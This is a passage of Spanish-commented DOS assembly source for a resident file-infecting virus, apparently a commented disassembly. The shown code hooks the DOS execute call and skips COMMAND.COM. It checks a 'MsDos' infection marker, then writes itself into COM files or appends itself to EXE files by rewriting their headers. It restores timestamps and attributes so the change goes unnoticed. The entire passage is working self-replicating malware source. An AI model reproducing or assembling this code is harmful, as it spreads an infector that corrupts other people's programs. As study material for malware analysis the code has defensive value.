                mov     ah,36h                                  ; Ä¿ obtiene el espacio libre
                int     21h                                     ; ÄÙ del disco indicado (o actual)
                cmp     ax,0FFFFh                               ; Ä¿ si ax <> FFFF (disco valido)
                jne     loc_16                                  ; ÄÙ => loc_16 (va a infectar)
loc_15:
                jmp     loc_42                                  ; => vieja int 21
loc_16:
                mul     bx                                      ; Ä¿ dx.ax = numero de bytes
                mul     cx                                      ; ÄÙ         libres en el disco
                or      dx,dx                                   ; Ä¿
                jnz     loc_17                                  ;  ³ si no hay lugar para
                cmp     ax,710h                                 ;  ³ el virus => vieja int 21
                jb      loc_15                                  ; ÄÙ
loc_17:
                mov     dx,cs:[infec_off_fname-offset start]    ; dx = off del fname
                push    ds                                      ; Ä¿ es = ds
                pop     es                                      ; ÄÙ
                xor     al,al                                   ; al = 00
                mov     cx,0041h                                ; cx = 65 (long max de fname)
                repne   scasb                                   ; busca el fin de cadena
                mov     si,cs:[infec_off_fname-offset start]    ; si = off del fname
loc_18:
                mov     al,[si]                                 ; al = sig caracter
                or      al,al                                   ; Ä¿ si al = 00 (fin de cadena)
                jz      loc_20                                  ; ÄÙ => loc_20
                cmp     al,'a'                                  ; Ä¿
                jb      loc_19                                  ;  ³ pasa la letra
                cmp     al,'z'                                  ;  ³ a mayuscula
                ja      loc_19                                  ;  ³
                sub     byte ptr [si],'a'-'A'                   ; ÄÙ
loc_19:
                inc     si                                      ; si + 1 (sig caracter)
                jmp     short loc_18                            ; => loc_18 (itera)
loc_20:
                mov     cx,long_command                         ; Ä¿ si - 11 (long 'COMMAND.COM')
                sub     si,cx                                   ; ÄÙ
                mov     di,offset command-offset start          ; Ä¿ es:di = 'COMMAND.COM'
                push    cs                                      ;  ³
                pop     es                                      ; ÄÙ
                mov     cx,long_command                         ; cx = long 'COMMAND.COM'
                repe    cmpsb                                   ; ve si el arch es el COMMAND.COM
                jnz     loc_21                                  ; si no es => continua infeccion
                jmp     loc_42                                  ; si es => vieja int 21
loc_21:
                mov     ax,4300h                                ; Ä¿ obtiene los atributos
                int     21h                                     ; ÄÙ del archivo
                jc      loc_22                                  ; si CF = 1 (ERR) => loc_40 *******
                mov     cs:[infec_atrib-offset start],cx        ; salva el atributo actual del arch
loc_22:
                jc      loc_24                                  ; si CF = 1 (ERR) => loc_40 *******
                xor     al,al                                   ; al = 00 (valor para indicar COM)
                mov     cs:[infec_esCOM-offset start],al        ; asume que el pgm es COM
                push    ds                                      ; Ä¿
                pop     es                                      ;  ³ es:dx = punt al fname
                mov     di,dx                                   ; ÄÙ
                mov     cx,0041h                                ; cx = long maxima del fname
                repne   scasb                                   ; busca el fin de fname
                cmp     byte ptr [di-2],4Dh                     ; Ä¿
                je      loc_23                                  ;  ³ si el arch a ejecutar es
                cmp     byte ptr [di-2],6Dh                     ;  ³ com (o COM) => loc_23
                je      loc_23                                  ; ÄÙ
                inc     byte ptr cs:[infec_esCOM-offset start]  ; indica que es EXE
loc_23:
                mov     ax,3D00h                                ; Ä¿ abre el arch a ejecutar
                int     21h                                     ; ÄÙ como read only
loc_24:
                jc      loc_26                                  ; si CF = 1 (ERR) => loc_40 (fin)
                mov     cs:[infec_fhandle-offset start],ax      ; salva el file handle
                mov     bx,ax                                   ; bx = file handle
                mov     ax,4202h                                ; Ä¿
                mov     cx,0FFFFh                               ;  ³ se mueve 5 bytes
                mov     dx,0FFFBh                               ;  ³ antes del EOF
                int     21h                                     ; ÄÙ
                jc      loc_24                                  ; si CF = 1 (ERR) => loc_40 (fin)
                add     ax,0005h                                ; Ä¿ ax + 5 (low byte of EOF)
                mov     cs:[long_huesped-offset start],ax       ; ÄÙ guarda la long del huesped
                mov     cx,0005h                                ; Ä¿
                mov     dx,offset infec_buffvirid-offset start  ;  ³ lee los ultimos 5 bytes
                mov     ax,cs                                   ;  ³ del huesped
                mov     ds,ax                                   ;  ³ en infect_buffvirid
                mov     es,ax                                   ;  ³ (es = ds = cs)
                mov     ah,3Fh                                  ;  ³
                int     21h                                     ; ÄÙ
                mov     di,dx                                   ; di = puntero a los 5 ult bytes
                mov     si,offset VIRUS_ID-offset start         ; si = puntero al VIRUS ID
                repe    cmpsb                                   ; compara los 5 bytes con el VIR ID
                jnz     loc_25                                  ; si no esta infectado => loc_25
                mov     ah,3Eh                                  ; Ä¿ cierra el archivo
                int     21h                                     ; ÄÙ (ya lo infecto)
                jmp     loc_42                                  ; => vieja int 21 (exec)
loc_25:
                mov     ax,3524h                                ; Ä¿ obtiene el puntero
                int     21h                                     ; ÄÙ de la int 24h
                mov     ds:[infec_offint24h-offset start],bx    ; Ä¿ salva el
                mov     ds:[infec_segint24h-offset start],es    ; ÄÙ puntero
                mov     dx,offset int24h-offset start           ; ds:dx = punt a la rut de int24
                mov     ax,2524h                                ; Ä¿ pone el nuevo
                int     21h                                     ; ÄÙ puntero de int 24
                lds     dx,dword ptr ds:[infec_off_fname-offset start] ; Ä¿ pone el archivo
                xor     cx,cx                                          ;  ³ como normal
                mov     ax,4301h                                       ;  ³ (para poder leerlo)
                int     21h                                            ; ÄÙ
loc_26:
                jc      loc_27                                  ; si CF = 1 (ERR) => loc_40 (fin)
                mov     bx,cs:[infec_fhandle-offset start]      ; Ä¿ cierra el
                mov     ah,3Eh                                  ;  ³ archivo
                int     21h                                     ; ÄÙ
                mov     cs:[infec_fhandle-offset start],0FFFFh  ; pone fhandle = FFFF (no abierto)
                mov     ax,3D02h                                ; Ä¿ abre el archivo
                int     21h                                     ; ÄÙ como read/write
                jc      loc_27                                  ; si CF = 1 (ERR) => loc_27
                mov     cs:[infec_fhandle-offset start],ax      ; salva al file handle
                mov     ax,cs                                   ; Ä¿
                mov     ds,ax                                   ;  ³ es = ds = cs
                mov     es,ax                                   ; ÄÙ
                mov     bx,ds:[infec_fhandle-offset start]      ; bx = fhandle
                mov     ax,5700h                                ; Ä¿ obtiene fecha y hora de
                int     21h                                     ; ÄÙ creacion del archivo
                mov     ds:[infec_fdate-offset start],dx        ; Ä¿ guarda la fecha
                mov     ds:[infec_ftime-offset start],cx        ; ÄÙ y hora de creacion
                mov     ax,4200h                                ; Ä¿
                xor     cx,cx                                   ;  ³ se mueve al comienzo
                mov     dx,cx                                   ;  ³ del archivo
                int     21h                                     ; ÄÙ
loc_27:
                jc      loc_30                                  ; si CF = 1 (ERR) => loc_40 (fin)
                cmp     byte ptr ds:[infec_esCOM-offset start],00h ; Ä¿ si no es COM
                je      infec_COM                                  ;  ³ => infecta un COM
                jmp     short infec_EXE                            ; ÄÙ
                nop
infec_COM:
                mov     bx,1000h                                ; Ä¿ pide 64 Kb de
                mov     ah,48h                                  ;  ³ memoria (como
                int     21h                                     ; ÄÙ buffer)
                jnc     loc_29                                  ; si CF = 0 (OK) => loc_29
                mov     ah,3Eh                                  ; Ä¿ cierra el archivo
                mov     bx,ds:[infec_fhandle-offset start]      ;  ³ (aborta la infeccion)
                int     21h                                     ; ÄÙ
                jmp     loc_42                                  ; => vieja int 21 (exec)
loc_29:
                inc     word ptr ds:[infec_pidiomem-offset start] ; indica que pidio memoria
                mov     es,ax                                   ; es = ax (segmento del buffer)
                xor     si,si                                   ; si = 0000 (punt al buffer)
                mov     di,si                                   ; di = 0000 (punt al com del VIRUS)
                mov     cx,long_virus                           ; cx = longitud del virus
                rep     movsb                                   ; copia el virus al buffer
                mov     dx,di                                   ; Ä¿
                mov     cx,ds:[long_huesped-offset start]       ;  ³
                mov     bx,ds:[infec_fhandle-offset start]      ;  ³ copia el huesped en el
                push    es                                      ;  ³ resto del buffer
                pop     ds                                      ;  ³
                mov     ah,3Fh                                  ;  ³
                int     21h                                     ; ÄÙ
loc_30:
                jc      loc_31                                  ; si CF = 1 (ERR) => loc_40 (fin)
                add     di,cx                                   ; di + cx (primer byte free en buf)
                xor     cx,cx                                   ; Ä¿
                mov     dx,cx                                   ;  ³ se mueve al comienzo
                mov     ax,4200h                                ;  ³ del archivo
                int     21h                                     ; ÄÙ
                mov     si,offset VIRUS_ID-offset start         ; Ä¿ copia el VIRUS ID
                mov     cx,long_VIRUS_ID                        ;  ³ al final del buffer
                db      0F3h, 2Eh, 0A4h                         ;  ³ (estos bytes equivalen
                                                                ; ÄÙ  a REPZ  CS:MOVSB)
                mov     cx,di                                   ; Ä¿
                xor     dx,dx                                   ;  ³ copia el buffer
                mov     ah,40h                                  ;  ³ al archivo
                int     21h                                     ; ÄÙ
loc_31:
                jc      loc_33                                  ; Ä¿ => loc_40 (finaliza, restaura
                jmp     loc_40                                  ; ÄÙ    mem, cierra archs, etc.)
infec_EXE:
                mov     cx,long_header                          ; Ä¿
                mov     dx,offset infec_EXEhead-offset start    ;  ³ lee el header del EXE
                mov     ah,3Fh                                  ;  ³ en infec_EXEhead
                int     21h                                     ; ÄÙ
loc_33:
                jc      loc_35                                  ; si CF = 1 (ERR) => loc_40 (fin)
                mov     ds:[infec_EXEhead-offset start+12h],1984h ; pone como checksum 1984
                mov     ax,ds:[infec_EXEhead-offset start+0Eh]  ; Ä¿
                mov     ds:[infec_ssEXEhead-offset start],ax    ;  ³ pone el ss:sp del EXE
                mov     ax,ds:[infec_EXEhead-offset start+10h]  ;  ³ en infec_spEXEheader
                mov     ds:[infec_spEXEhead-offset start],ax    ; ÄÙ
                mov     ax,ds:[infec_EXEhead-offset start+14h]  ; Ä¿
                mov     ds:[infec_ipEXEhead-offset start],ax    ;  ³ pone el cs:ip del EXE
                mov     ax,ds:[infec_EXEhead-offset start+16h]  ;  ³ en infec_ipEXEheader
                mov     ds:[infec_csEXEhead-offset start],ax    ; ÄÙ
                mov     ax,ds:[infec_EXEhead-offset start+04h]  ; ax = # de pags de 512 bs del arch
                cmp     word ptr ds:[infec_EXEhead-offset start+02h],0000h ; Ä¿ si la ultima pag esta llena
                je      loc_34                                             ; ÄÙ => loc_34
                dec     ax                                      ; ax - 1 (hay una pag complt menos)
loc_34:
                mul     word ptr ds:[infec_longpag-offset start] ; Ä¿
                add     ax,ds:[infec_EXEhead-offset start+02h]   ;  ³
                adc     dx,0000h                                 ;  ³ dx.ax = long en bytes
                add     ax,000Fh                                 ;  ³         del arch redondeada
                adc     dx,0000h                                 ;  ³         a multiplo de 16
                and     ax,0FFF0h                                ; ÄÙ
                mov     word ptr ds:[infec_longEXE-offset start],ax   ; Ä¿ guarda la longitud
                mov     word ptr ds:[infec_longEXE+2-offset start],dx ; ÄÙ real del EXE
                add     ax,long_virus                           ; Ä¿ le suma la long
                adc     dx,0000h                                ; ÄÙ del VIRUS
loc_35:
                jc      loc_37                                  ; si CF = 1 ( > 4Gb) => loc_40 (fin)
                div     word ptr ds:[infec_longpag-offset start] ; calcula la cant de paginas
                or      dx,dx                                   ; Ä¿ si se completo la ult pagina
                jz      loc_36                                  ; ÄÙ => loc_36
                inc     ax                                      ; ax + 1 (1 pag mas)
loc_36:
                mov     ds:[infec_EXEhead-offset start+04h],ax  ; pone la long en pag del arch
                mov     ds:[infec_EXEhead-offset start+02h],dx  ; pone la long del arch mod 512
                mov     ax,word ptr ds:[infec_longEXE-offset start]   ; Ä¿ dx.ax = longitud real del EXE
                mov     dx,word ptr ds:[infec_longEXE+2-offset start] ; ÄÙ
                div     word ptr ds:[infec_longparag-offset start] ; ax = cantidad de parag del EXE
                sub     ax,ds:[infec_EXEhead-offset start+08h]  ; ax - long del header en parag
                mov     ds:[infec_EXEhead-offset start+16h],ax                                 ; Ä¿ pone cs:ip del header
                mov     word ptr ds:[infec_EXEhead-offset start+14h],offset VIRUS-offset start ; ÄÙ al final del EXE
                mov     ds:[infec_EXEhead-offset start+0Eh],ax              ; Ä¿ pone ss:sp del head
                mov     ds:[infec_EXEhead-offset start+10h],_tope_stack_xtr ; ÄÙ al final del EXE
                xor     cx,cx                                   ; Ä¿
                mov     dx,cx                                   ;  ³ se mueve al comienzo
                mov     ax,4200h                                ;  ³ del archivo
                int     21h                                     ; ÄÙ
loc_37:
                jc      loc_38                                  ; si CF = 1 (ERR) => loc_40 (fin)
                mov     cx,long_header                          ; Ä¿
                mov     dx,offset infec_EXEhead-offset start    ;  ³ graba el header
                mov     ah,40h                                  ;  ³ del EXE
                int     21h                                     ; ÄÙ
loc_38:
                jc      loc_39                                  ; si CF = 1 (ERR) => loc_40 (fin)
                cmp     ax,cx                                   ; Ä¿ si no grabo todo el header
                jne     loc_40                                  ; ÄÙ => loc_40 (fin)
                mov     dx,word ptr ds:[infec_longEXE-offset start]    ; Ä¿
                mov     cx,word ptr ds:[infec_longEXE+2-offset start]  ;  ³ se mueve al final
                mov     ax,4200h                                       ;  ³ del archivo
                int     21h                                            ; ÄÙ
loc_39:
                jc      loc_40                                  ; si CF = 1 (ERR) => loc_40 (fin)
                xor     dx,dx                                   ; Ä¿
                mov     cx,long_virus                           ;  ³ graba el virus al
                mov     ah,40h                                  ;  ³ final del archivo
                int     21h                                     ; ÄÙ
loc_40:
                cmp     word ptr cs:[infec_pidiomem-offset start],0000h ; Ä¿ si no pidio memoria
                je      loc_41                                          ; ÄÙ => loc_41
                mov     ah,49h                                  ; Ä¿ libera la mem
                int     21h                                     ; ÄÙ que pidio
loc_41:
                cmp     cs:[infec_fhandle-offset start],0FFFFh  ; Ä¿ si no hay un fhandle valido
                je      loc_42                                  ; ÄÙ => loc_42 (vieja int 21)
                mov     bx,cs:[infec_fhandle-offset start]      ; Ä¿
                mov     dx,cs:[infec_fdate-offset start]        ;  ³ setea la fecha y hora
                mov     cx,cs:[infec_ftime-offset start]        ;  ³ de creacion del archivo
                mov     ax,5701h                                ;  ³
                int     21h                                     ; ÄÙ
                mov     ah,3Eh                                  ; Ä¿ cierra el archivo
                int     21h                                     ; ÄÙ
                lds     dx,dword ptr cs:[infec_off_fname-offset start] ; Ä¿
                mov     cx,cs:[infec_atrib-offset start]               ;  ³ restaura los atributos
                mov     ax,4301h                                       ;  ³ del archivo
                int     21h                                            ; ÄÙ
                lds     dx,dword ptr cs:[infec_offint24h-offset start] ; Ä¿
                mov     ax,2524h                                       ;  ³ restaura la vieja int 24
                int     21h                                            ; ÄÙ
loc_42:
                pop     es                                      ; Ä¿
                pop     ds                                      ;  ³
                pop     di                                      ;  ³ restaura
                pop     si                                      ;  ³ los
                pop     dx                                      ;  ³ registros
                pop     cx                                      ;  ³
                pop     bx                                      ;  ³
                pop     ax                                      ; ÄÙ
                popf                                            ; restaura los flags
                jmp     dword ptr cs:[offvie_int21h-offset start] ; salta a la vieja int 21
int21h          endp


                align   16                                      ; continua en el sig paragraph

_stack          db      100h dup (00h)                          ; stack del virus (es de 100h bytes)

_stack_extra    db      10h dup (00h)                           ; stack cuando esta residente

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ                     programa huesped (infectado)                                         ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

                org     0810h

inicio_huesped: mov     ax,4C00h                                ; Ä¿ el huesped es ficticio
                int     21h                                     ; ÄÙ (solo termina)

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛ                     VIRUS ID (el pgm ya esta infectado)                                  ÛÛ
; ÛÛ                                                                                          ÛÛ
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

HUESPED_INFEC   db      'MsDos'                                 ; se¤al para generar un original infectado


_codeseg        ends
                end     start

